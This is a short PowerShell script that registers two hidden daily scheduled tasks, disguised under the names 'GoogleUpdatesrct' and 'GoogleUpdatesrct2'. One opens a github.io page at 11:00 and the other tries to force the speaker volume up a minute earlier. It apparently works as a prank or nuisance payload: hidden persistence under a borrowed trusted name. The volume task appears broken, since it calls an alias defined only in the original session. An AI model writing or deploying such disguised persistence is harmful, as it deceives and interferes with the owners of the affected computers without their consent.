
Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}

Set-Alias setspeaker Set-Speaker

$settings = New-ScheduledTaskSettingsSet -Hidden
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "Start-Process https://Luigit12.github.io"
$trigger = New-ScheduledTaskTrigger -Daily -At 11:00
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'GoogleUpdatesrct' -Settings $settings

$action2 = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "setspeaker -volume 50"
$trigger2 = New-ScheduledTaskTrigger -Daily -At 10:59
Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName 'GoogleUpdatesrct2' -Settings $settings
